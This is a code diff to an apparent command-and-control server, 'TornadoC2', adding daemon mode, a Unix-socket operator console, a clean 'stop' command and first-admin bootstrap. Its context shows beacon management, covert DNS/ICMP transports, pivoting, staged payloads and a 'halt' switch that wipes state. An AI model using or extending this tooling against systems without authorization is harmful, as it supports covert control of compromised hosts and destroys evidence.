@@ -26,9 +26,11 @@ Everything else in ``beacon/`` is self-contained.
 import argparse
 import base64
 import os
+import signal
 import socket
 import subprocess
 import sys
+import threading
 import time
 
 import secrets
@@ -241,6 +243,13 @@ class BeaconHandler:
         self.deadman = None
         self.updater = Updater(self)
 
+        self._daemon_mode = False
+        self._shutdown_event = None
+        self._console_socket_path = None
+        self._console_conn = None
+        self._shutdown_lock = threading.Lock()
+        self._console_should_exit = False
+
     # ------------------------------------------------------------------
     # Banner
 
@@ -268,32 +277,37 @@ class BeaconHandler:
     # Restart support
 
     def shutdown_for_restart(self):
-        for attr in (
-            '_beacon_listener', '_dns_transport', '_icmp_transport',
-            '_quic_listener', '_ws_listener', '_ws_server',
-            '_wireguard_transport', '_pivot_manager',
-            '_client_tunnel', 'operator_listener',
-        ):
-            obj = getattr(self, attr, None)
-            if obj is None:
-                continue
-            try:
-                stop = getattr(obj, 'stop', None)
-                if callable(stop):
-                    stop()
-            except Exception:
-                pass
+        if not self._shutdown_lock.acquire(blocking=False):
+            return
+        try:
+            for attr in (
+                '_beacon_listener', '_dns_transport', '_icmp_transport',
+                '_quic_listener', '_ws_listener', '_ws_server',
+                '_wireguard_transport', '_pivot_manager',
+                '_client_tunnel', 'operator_listener',
+            ):
+                obj = getattr(self, attr, None)
+                if obj is None:
+                    continue
+                try:
+                    stop = getattr(obj, 'stop', None)
+                    if callable(stop):
+                        stop()
+                except Exception:
+                    pass
 
-        if self.deadman is not None:
-            try:
-                stop = getattr(self.deadman, 'stop', None)
-                if callable(stop):
-                    stop()
-            except Exception:
-                pass
+            if self.deadman is not None:
+                try:
+                    stop = getattr(self.deadman, 'stop', None)
+                    if callable(stop):
+                        stop()
+                except Exception:
+                    pass
 
-        sys.stdout.flush()
-        sys.stderr.flush()
+            sys.stdout.flush()
+            sys.stderr.flush()
+        finally:
+            self._shutdown_lock.release()
 
     # ------------------------------------------------------------------
     # TLS / mTLS certificate bootstrap
@@ -616,8 +630,7 @@ class BeaconHandler:
             return sorted(c for c in MAIN_COMMANDS
                           if c.startswith(text.lower()))
 
-        if arg_i == 1 and cmd in (
-                'beacon', 'beacon-rm', 'beacon-forget'):
+        if arg_i == 1 and cmd in ('beacon-rm', 'beacon-forget'):
             return sorted(i for i in self._get_beacon_ids()
                           if i.startswith(text))
 
@@ -3686,7 +3699,208 @@ class BeaconHandler:
                   f"{s['check_seconds']:.0f}s"
                   f"{self.colors['end']}")
 
-        self._main_loop()
+        if self._daemon_mode:
+            self._daemon_loop()
+        else:
+            self._main_loop()
+
+    # ------------------------------------------------------------------
+    # Daemon mode
+    # ------------------------------------------------------------------
+
+    def _daemon_loop(self) -> None:
+        """Daemon-mode event loop.
+
+        Spawns the console-socket thread, installs SIGTERM /
+        SIGINT / SIGHUP handlers, writes the pidfile once the
+        socket is listening, then blocks until shutdown. The
+        listeners started by start() keep running on their own
+        threads. A console client that attaches and detaches does
+        not affect the daemon; only SIGTERM (or `halt` typed at
+        an attached console) stops it.
+        """
+        rt = _runtime_dir()
+        socket_path = self._console_socket_path or os.path.join(
+            rt, _SOCKET_NAME)
+        self._shutdown_event = threading.Event()
+
+        console_thread = threading.Thread(
+            target=self._serve_console_socket,
+            args=(socket_path, self._shutdown_event),
+            daemon=True,
+            name='console-socket',
+        )
+        console_thread.start()
+
+        print(f'[daemon] running; pid={os.getpid()}', flush=True)
+        print(f'[daemon] listeners active; SIGTERM to stop', flush=True)
+
+        def _on_sigterm(signum, frame):
+            print(f'[daemon] SIGTERM received; shutting down',
+                  flush=True)
+            self._shutdown_event.set()
+            conn = getattr(self, '_console_conn', None)
+            if conn is not None:
+                try:
+                    conn.shutdown(socket.SHUT_RDWR)
+                except OSError:
+                    pass
+
+        signal.signal(signal.SIGTERM, _on_sigterm)
+        signal.signal(signal.SIGINT, signal.SIG_IGN)
+        signal.signal(signal.SIGHUP, signal.SIG_IGN)
+
+        for _ in range(100):
+            if os.path.exists(socket_path):
+                break
+            time.sleep(0.1)
+
+        pidfile = os.path.join(rt, _PIDFILE_NAME)
+        try:
+            with open(pidfile, 'w') as fh:
+                fh.write(f'{os.getpid()}\n')
+                fh.flush()
+                os.fsync(fh.fileno())
+        except OSError as exc:
+            print(f'[daemon] could not write pidfile: {exc}',
+                  flush=True)
+
+        try:
+            while not self._shutdown_event.is_set():
+                self._shutdown_event.wait(timeout=1.0)
+        finally:
+            try:
+                self.shutdown_for_restart()
+            except Exception:
+                pass
+            try:
+                os.remove(pidfile)
+            except OSError:
+                pass
+
+    def _serve_console_socket(self, socket_path: str,
+                              shutdown_event: 'threading.Event') -> None:
+        """Accept console clients on a Unix domain socket.
+
+        Only one client at a time. A second client that connects
+        while the first is attached gets a "busy" line and is
+        closed. The socket path is removed on shutdown so a stale
+        socket file does not break the next start.
+        """
+        if os.path.exists(socket_path):
+            try:
+                os.remove(socket_path)
+            except OSError:
+                pass
+
+        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        try:
+            srv.bind(socket_path)
+            os.chmod(socket_path, 0o600)
+            srv.listen(1)
+            srv.settimeout(1.0)
+
+            print(f'[daemon] console socket at {socket_path}',
+                  flush=True)
+
+            busy = False
+            while not shutdown_event.is_set():
+                try:
+                    conn, _ = srv.accept()
+                except socket.timeout:
+                    continue
+                except OSError:
+                    break
+
+                if busy:
+                    try:
+                        conn.sendall(
+                            b'[daemon] another console is attached; '
+                            b'only one at a time. Detach it first.\n')
+                    except OSError:
+                        pass
+                    try:
+                        conn.close()
+                    except OSError:
+                        pass
+                    continue
+
+                busy = True
+                try:
+                    self._serve_console_connection(conn)
+                finally:
+                    busy = False
+        finally:
+            try:
+                srv.close()
+            except OSError:
+                pass
+            try:
+                os.remove(socket_path)
+            except OSError:
+                pass
+
+    def _serve_console_connection(self, conn) -> None:
+        """Hijack sys.stdout / sys.stdin for one console connection,
+        run the existing _main_loop(), then restore both streams.
+
+        Colors are suppressed for the duration: a socket client's
+        terminal capability is unknown, and a raw escape sequence
+        landing in a log viewer or a non-color terminal is worse
+        than losing the pretty prompt for the duration of the
+        session. _main_loop() and every command handler read
+        `self.colors` at call time, so the swap takes effect for
+        every prompt and every print without touching any caller.
+        """
+        import io
+
+        saved_stdout = sys.stdout
+        saved_stderr = sys.stderr
+        saved_stdin = sys.stdin
+        saved_colors = self.colors
+
+        rfile = conn.makefile('rb', buffering=0)
+        wfile = conn.makefile('wb', buffering=0)
+
+        sys.stdout = io.TextIOWrapper(
+            wfile, line_buffering=True, encoding='utf-8',
+            write_through=True)
+        sys.stderr = sys.stdout
+        sys.stdin = io.TextIOWrapper(
+            rfile, encoding='utf-8', errors='replace')
+        self.colors = {k: '' for k in saved_colors}
+        self._console_conn = conn
+
+        try:
+            sys.stdout.write(
+                f'[console] attached to daemon '
+                f'(pid {os.getpid()}). Detach with Ctrl+D.\n')
+            sys.stdout.write(
+                f'[console] type `help` for commands.\n\n')
+            sys.stdout.flush()
+            self._main_loop()
+        except Exception as exc:
+            try:
+                sys.stdout.write(f'[console] error: {exc}\n')
+                sys.stdout.flush()
+            except Exception:
+                pass
+        finally:
+            self._console_conn = None
+            self._console_should_exit = False
+            sys.stdout = saved_stdout
+            sys.stderr = saved_stderr
+            sys.stdin = saved_stdin
+            self.colors = saved_colors
+            for fh in (rfile, wfile):
+                try:
+                    fh.close()
+                except Exception:
+                    pass
+            try:
+                conn.close()
+            except Exception:
+                pass
 
     # ------------------------------------------------------------------
     # Dead-man's switch
@@ -3704,7 +3918,8 @@ class BeaconHandler:
         cmd = parts[0].lower()
         sub = parts[1].lower() if len(parts) > 1 else ''
 
-        if cmd in ('help', 'exit', 'quit', 'q'):
+        if cmd in ('help', 'exit', 'quit', 'q',
+                   'stop', 'shutdown', 'kill'):
             return True
         if cmd in ('beacons', 'bl'):
             return True
@@ -3746,6 +3961,8 @@ class BeaconHandler:
     def _main_loop(self):
         c = self.colors
         while True:
+            if self._console_should_exit:
+                break
             try:
                 line = input(f"{c['green']}beacon> {c['end']}").strip()
             except (KeyboardInterrupt, EOFError):
@@ -3759,6 +3976,10 @@ class BeaconHandler:
                 self._touch_activity(source='local')
 
             if cmd in ('exit', 'quit', 'q'):
+                if self._daemon_mode:
+                    print(f"{c['dim']}[console] detaching. "
+                          f"The daemon continues running."
+                          f"{c['end']}")
                 break
             if cmd == 'update':
                 self.updater.handle_command(parts)
@@ -3768,17 +3989,6 @@ class BeaconHandler:
                     self.beacon_console.print_list()
                 except Exception as exc:
                     print(f"{c['red']}Error: {exc}{c['end']}")
-                continue
-            if cmd == 'beacon':
-                if len(parts) < 2:
-                    print(f"{c['red']}Usage: beacon <ID>{c['end']}")
-                    continue
-                try:
-                    sid = int(parts[1])
-                except ValueError:
-                    print(f"{c['red']}Invalid ID{c['end']}")
-                    continue
-                self.beacon_console.attach(sid)
                 continue
             if cmd in ('beacon-build', 'bbuild'):
                 self.beacon_build(parts)
@@ -3819,6 +4029,9 @@ class BeaconHandler:
                 continue
             if cmd == 'halt':
                 self._cmd_halt(parts)
+                continue
+            if cmd in ('stop', 'shutdown', 'kill'):
+                self._cmd_stop(parts)
                 continue
             if cmd in ('rotate-cookies', 'rotate'):
                 if self.beacon is None:
@@ -3935,6 +4148,70 @@ class BeaconHandler:
                 return
 
         self.deadman.manual_halt(reason='console')
+
+    def _cmd_stop(self, parts):
+        """stop [--force]
+
+        Stop the handler cleanly, preserving the TornadoC2 tree.
+
+        Distinct from `halt`, which is the dead-man's switch
+        trigger and wipes the tree, and from beacon-scope `kill`,
+        which self-destructs a beacon. `stop` stops every listener,
+        removes the pidfile (daemon mode only), and exits the
+        process — nothing on disk is touched.
+
+        In daemon mode, the console client that typed `stop` sees
+        the socket close and disconnects as a consequence of the
+        daemon exiting.
+
+        `--force` skips the confirmation prompt.
+        """
+        c = self.colors
+        force = '--force' in parts or '-f' in parts
+
+        if not force and sys.stdin.isatty():
+            print()
+            print(f"  {c['yellow']}this will:{c['end']}")
+            print(f"    - stop every listener")
+            if self._daemon_mode:
+                print(f"    - stop the daemon process")
+                print(f"    - close the console socket")
+                print(f"    - remove "
+                      f"{os.path.join(_runtime_dir(), _PIDFILE_NAME)}")
+            print(f"    - exit the handler process")
+            print(f"  {c['dim']}The TornadoC2 tree is preserved. "
+                  f"Use `halt` to wipe it.{c['end']}")
+            print()
+            try:
+                ans = input(
+                    f"  {c['green']}proceed? [y/N]{c['end']} "
+                ).strip().lower()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                return
+            if ans not in ('y', 'yes'):
+                print(f"{c['dim']}stop cancelled{c['end']}")
+                return
+
+        # Stop listeners first, so the daemon's own cleanup in
+        # _daemon_loop's finally block is a no-op (the shutdown
+        # lock makes it idempotent).
+        try:
+            self.shutdown_for_restart()
+        except Exception as exc:
+            print(f"{c['red']}[stop] error stopping listeners: "
+                  f"{exc}{c['end']}")
+
+        if self._daemon_mode:
+            print(f"{c['green']}[stop] daemon shutting down; "
+                  f"pidfile will be removed{c['end']}")
+            if self._shutdown_event is not None:
+                self._shutdown_event.set()
+        else:
+            print(f"{c['green']}[stop] handler shutting down"
+                  f"{c['end']}")
+
+        self._console_should_exit = True
 
     # ------------------------------------------------------------------
     # Team server console commands
@@ -4630,7 +4907,6 @@ class BeaconHandler:
         print(f"""
 {c['green']}BEACONS:{c['end']}
   beacons / bl            List active beacons
-  beacon <ID>             Attach to a beacon console
   beacon-build [<os> <arch> [flags]]
                           Compile an agent (wizard if no args)
   beacon-build -c <file>  Compile from a JSON build config
@@ -4649,11 +4925,24 @@ class BeaconHandler:
                           authentication. New passwords use scrypt
                           (128 MiB working set). `operator export`
                           writes a client config file.
+  stop / shutdown / kill  Stop the handler cleanly. Stops every
+                          listener and exits the process. In daemon
+                          mode this stops the daemon and removes its
+                          pidfile and console socket. The TornadoC2
+                          tree, the signing keys, the team CA, the
+                          audit chain, and every staged payload are
+                          preserved. Distinct from `halt`, which is
+                          the dead-man's switch trigger and wipes
+                          the tree, and from beacon-scope `kill`,
+                          which self-destructs a beacon. Confirm
+                          prompt unless --force.
   halt [--force] [shutdown|reboot]
                           Run the shutdown sequence now: stop
-                          listeners, wipe state directories,
+                          listeners, WIPE the TornadoC2 tree,
                           optionally power off or reboot, exit.
                           Confirm prompt unless --force.
+                          Destructive — use `stop` for a clean
+                          shutdown that preserves state.
   deadman status|arm|arm-until|reset|disable|warn|halt
                           Manage the auto-shutdown watchdog.
                           `deadman halt <mode>` sets what runs
@@ -4839,6 +5128,289 @@ class BeaconHandler:
 
 
 # ---------------------------------------------------------------------
+# Daemonization / console-attach plumbing
+# ---------------------------------------------------------------------
+
+_PIDFILE_NAME = 'tornadoc2.pid'
+_LOG_NAME = 'console.log'
+_SOCKET_NAME = 'tornadoc2.sock'
+
+
+def _repo_root() -> str:
+    """Absolute path of the repository root.
+
+    The handler lives at ``<repo>/tornadoc2/beacon_handler.py``,
+    so two ``dirname`` calls land on ``<repo>``. Every state path
+    the handler resolves (``.keys/``, ``mtls_certs/``, ``logs/``)
+    is CWD-relative; the daemon chdirs here so it does not depend
+    on wherever the operator happened to be standing.
+    """
+    return os.path.dirname(
+        os.path.dirname(os.path.abspath(__file__)))
+
+
+def _runtime_dir() -> str:
+    """Directory for pidfile, log, and console socket."""
+    d = os.path.join(_repo_root(), 'logs')
+    os.makedirs(d, exist_ok=True)
+    return d
+
+
+def _pid_is_tornadoc2(pid: int):
+    """Best-effort check that ``pid`` is a TornadoC2 process.
+
+    Returns True if it clearly is, False if it clearly is not, and
+    None when the platform cannot tell. The caller treats None as
+    "assume ours" so a portable detection miss never causes a
+    double-start.
+    """
+    try:
+        proc_cmdline = f'/proc/{pid}/cmdline'
+        if os.path.exists(proc_cmdline):
+            with open(proc_cmdline, 'rb') as fh:
+                cmdline = fh.read().replace(
+                    b'\x00', b' ').decode('utf-8', 'replace')
+            return 'tornadoc2' in cmdline
+    except OSError:
+        pass
+    try:
+        import subprocess as _sp
+        out = _sp.run(
+            ['ps', '-o', 'command=', '-p', str(pid)],
+            capture_output=True, text=True, timeout=2.0)
+        if out.returncode != 0:
+            return None
+        return 'tornadoc2' in out.stdout
+    except Exception:
+        return None
+
+
+def _daemonize() -> None:
+    """Re-launch as a detached subprocess and exit the parent.
+
+    The child is a fresh interpreter running the same argv with a
+    hidden ``--_daemon-child`` marker; nothing in this process is
+    inherited across the boundary. The child writes the pidfile
+    once its console socket is bound — the parent polls for it,
+    so a child that dies during startup is reported as a startup
+    failure instead of a false success.
+
+    Unix only. ``main()`` refuses ``--daemon`` on Windows before
+    this function is called.
+    """
+    rt = _runtime_dir()
+    pidfile = os.path.join(rt, _PIDFILE_NAME)
+    logfile = os.path.join(rt, _LOG_NAME)
+
+    # Refuse if another daemon is already running.
+    if os.path.isfile(pidfile):
+        try:
+            with open(pidfile, 'r') as fh:
+                existing = int(fh.read().strip())
+            os.kill(existing, 0)
+        except (OSError, ValueError):
+            # Stale pidfile (process gone, or garbage contents).
+            try:
+                os.remove(pidfile)
+            except OSError:
+                pass
+        else:
+            is_ours = _pid_is_tornadoc2(existing)
+            if is_ours is False:
+                # Recycled PID; the pidfile is stale.
+                try:
+                    os.remove(pidfile)
+                except OSError:
+                    pass
+            else:
+                print(f'[daemon] a daemon is already running '
+                      f'(pid {existing}); pidfile={pidfile}')
+                raise SystemExit(1)
+
+    import subprocess
+
+    argv = [a for a in sys.argv if a != '--daemon']
+    child_argv = [sys.executable] + argv + ['--_daemon-child']
+
+    log_fh = open(logfile, 'ab', buffering=0)
+    try:
+        proc = subprocess.Popen(
+            child_argv,
+            stdin=subprocess.DEVNULL,
+            stdout=log_fh,
+            stderr=log_fh,
+            close_fds=True,
+            start_new_session=True,
+        )
+    finally:
+        log_fh.close()
+
+    print(f'[daemon] starting pid={proc.pid}')
+    print(f'[daemon] logfile {logfile}')
+    print(f'[daemon] console socket {os.path.join(rt, _SOCKET_NAME)}')
+    print(f'[daemon] attach with: {sys.executable} {sys.argv[0]} console')
+    print(f'[daemon] stop with:   kill $(cat {pidfile})')
+
+    # Poll for the child's readiness signal (the pidfile it writes
+    # after its console socket is bound).
+    deadline = time.time() + 15.0
+    while time.time() < deadline:
+        if os.path.exists(pidfile):
+            print(f'[daemon] ready')
+            return
+        if proc.poll() is not None:
+            print(f'[daemon] child exited (code {proc.returncode}) '
+                  f'before writing pidfile; see {logfile}')
+            raise SystemExit(1)
+        time.sleep(0.1)
+    print(f'[daemon] child did not write pidfile within 15s; '
+          f'see {logfile}')
+    raise SystemExit(1)
+
+
+def _attach_console(socket_path: str) -> int:
+    """Relay between the local terminal and the daemon console socket.
+
+    Ctrl+D closes the write half of the socket; the daemon's
+    ``input()`` sees EOF, ``_main_loop()`` returns, and the daemon
+    keeps running. Ctrl+C is delivered to the local terminal; the
+    daemon ignores it because it did not inherit our process group.
+    """
+    import select
+
+    if not os.path.exists(socket_path):
+        print(f'[console] no daemon socket at {socket_path}')
+        print(f'[console] is the handler running with --daemon?')
+        return 1
+
+    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    try:
+        sock.connect(socket_path)
+    except OSError as exc:
+        print(f'[console] connect {socket_path}: {exc}')
+        return 1
+
+    sock.setblocking(False)
+    stdin_fd = sys.stdin.fileno()
+    stdin_open = True
+
+    try:
+        while True:
+            watch = [sock] + ([stdin_fd] if stdin_open else [])
+            try:
+                ready, _, _ = select.select(watch, [], [])
+            except (OSError, ValueError):
+                break
+
+            if sock in ready:
+                try:
+                    data = sock.recv(4096)
+                except (ConnectionResetError, OSError):
+                    break
+                if not data:
+                    break
+                try:
+                    sys.stdout.write(data.decode('utf-8', 'replace'))
+                    sys.stdout.flush()
+                except BrokenPipeError:
+                    break
+
+            if stdin_open and stdin_fd in ready:
+                line = sys.stdin.readline()
+                if not line:
+                    stdin_open = False
+                    try:
+                        sock.shutdown(socket.SHUT_WR)
+                    except OSError:
+                        pass
+                    continue
+                try:
+                    sock.sendall(line.encode('utf-8'))
+                except (BrokenPipeError, OSError):
+                    break
+    except KeyboardInterrupt:
+        pass
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+        print()
+        print('[console] disconnected; reattach with `console` '
+              'to check the daemon.')
+    return 0
+
+
+def _bootstrap_admin(args) -> int:
+    """Send a scripted sequence to the daemon console socket and exit.
+
+    Solves the chicken-and-egg problem of the first admin: no
+    config file exists to run `operator add` from a remote client,
+    and no operator terminal is attached. The daemon must already
+    be running with ``--operator-port``.
+
+    When ``--bootstrap-password`` is supplied, the password is
+    injected twice — once for the password prompt and once for the
+    confirmation prompt in ``_cmd_operator``. Sending it once
+    would leave the confirmation prompt to consume the next
+    command line, causing "passwords do not match" and a failed
+    bootstrap. When no password is supplied, a single blank line
+    is sent, which the code path treats as "cert-only operator, no
+    confirmation needed."
+    """
+    socket_path = (args.console_socket
+                   or os.path.join(_runtime_dir(), _SOCKET_NAME))
+    if not os.path.exists(socket_path):
+        print(f'[bootstrap] no daemon socket at {socket_path}')
+        return 1
+
+    out_path = args.bootstrap_out or (args.bootstrap_admin + '.cfg')
+
+    if args.bootstrap_password:
+        lines = [
+            f'operator add {args.bootstrap_admin} {args.bootstrap_role}',
+            args.bootstrap_password,
+            args.bootstrap_password,
+            f'operator export {args.bootstrap_admin} {out_path}',
+            'exit',
+        ]
+    else:
+        lines = [
+            f'operator add {args.bootstrap_admin} {args.bootstrap_role}',
+            '',                            # blank password prompt
+            f'operator export {args.bootstrap_admin} {out_path}',
+            'exit',
+        ]
+    script = ('\n'.join(lines) + '\n').encode('utf-8')
+
+    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    try:
+        sock.connect(socket_path)
+    except OSError as exc:
+        print(f'[bootstrap] connect {socket_path}: {exc}')
+        return 1
+
+    try:
+        sock.sendall(script)
+        try:
+            sock.shutdown(socket.SHUT_WR)
+        except OSError:
+            pass
+        while True:
+            data = sock.recv(4096)
+            if not data:
+                break
+            sys.stdout.write(data.decode('utf-8', 'replace'))
+            sys.stdout.flush()
+    except OSError as exc:
+        print(f'[bootstrap] {exc}')
+        return 1
+    finally:
+        sock.close()
+    return 0
+
+
+# ---------------------------------------------------------------------
 # Entry point
 
 def main():
@@ -4968,7 +5540,77 @@ def main():
     parser.add_argument(
         '--wireguard-server-ip', default='10.99.0.1',
         help='Server IP inside the tunnel (default 10.99.0.1).')
+
+    # ---- Daemon / console / bootstrap -------------------------------
+    parser.add_argument(
+        '--daemon', action='store_true',
+        help='Run in the background. Detaches from the terminal, '
+             'writes logs/tornadoc2.pid, and exits the foreground '
+             'process. Attach later with `tornadoc2.py console`. '
+             'Unix only; on Windows use nssm or Task Scheduler.')
+    parser.add_argument(
+        '--console', action='store_true',
+        help='Attach to the local console of a running --daemon. '
+             'Ctrl+D detaches without stopping the daemon.')
+    parser.add_argument(
+        '--console-socket', default=None,
+        help='Override the console socket path '
+             '(default: <repo>/logs/tornadoc2.sock).')
+    parser.add_argument(
+        '--_daemon-child', action='store_true',
+        help=argparse.SUPPRESS)
+    parser.add_argument(
+        '--bootstrap-admin', default=None,
+        help='Create the first admin operator and export its '
+             'config, then exit. Run against a running daemon '
+             'started with --operator-port.')
+    parser.add_argument(
+        '--bootstrap-role', default='admin',
+        choices=('admin', 'operator', 'viewer', 'guardian'),
+        help='Role for --bootstrap-admin (default: admin).')
+    parser.add_argument(
+        '--bootstrap-out', default=None,
+        help='Output path for the exported --bootstrap-admin '
+             'config (default: <name>.cfg in CWD).')
+    parser.add_argument(
+        '--bootstrap-password', default=None,
+        help='Password for --bootstrap-admin. Omit for cert-only '
+             'auth. If supplied, the operator is created with a '
+             'password and must be given it out of band.')
     args = parser.parse_args()
+
+    # ---- Early dispatch: console-attach and bootstrap ------------
+    # Both bypass BeaconHandler entirely; they only need the socket
+    # a running daemon is listening on.
+    if args.console:
+        socket_path = (args.console_socket
+                       or os.path.join(_runtime_dir(), _SOCKET_NAME))
+        return _attach_console(socket_path)
+
+    if args.bootstrap_admin:
+        if os.name == 'nt':
+            print('--bootstrap-admin is Unix-only; run it from '
+                  'the daemon host.')
+            return 1
+        return _bootstrap_admin(args)
+
+    # ---- Daemonize before constructing BeaconHandler -------------
+    if args.daemon and not args._daemon_child:
+        if os.name == 'nt':
+            print('--daemon is Unix-only. On Windows, run the '
+                  'handler under nssm or Task Scheduler.')
+            return 1
+        # Pin CWD to the repo root so every relative state path
+        # (.keys/, mtls_certs/, logs/) resolves to the same place
+        # regardless of where the operator typed the command.
+        os.chdir(_repo_root())
+        _daemonize()
+        return 0
+
+    if args._daemon_child:
+        # The parent has already chdir'd before re-exec, but a
+        # direct launch with --_daemon-child would still need it.
+        os.chdir(_repo_root())
 
     h = BeaconHandler(
         host=args.host,
@@ -5011,8 +5653,14 @@ def main():
     else:
         h.quic_port = args.beacon_quic_port
 
+    h._daemon_mode = bool(args._daemon_child)
+    h._console_socket_path = (
+        args.console_socket
+        or os.path.join(_runtime_dir(), _SOCKET_NAME))
+
     h.start()
+    return 0
 
 
 if __name__ == '__main__':
-    main()
+    sys.exit(main())
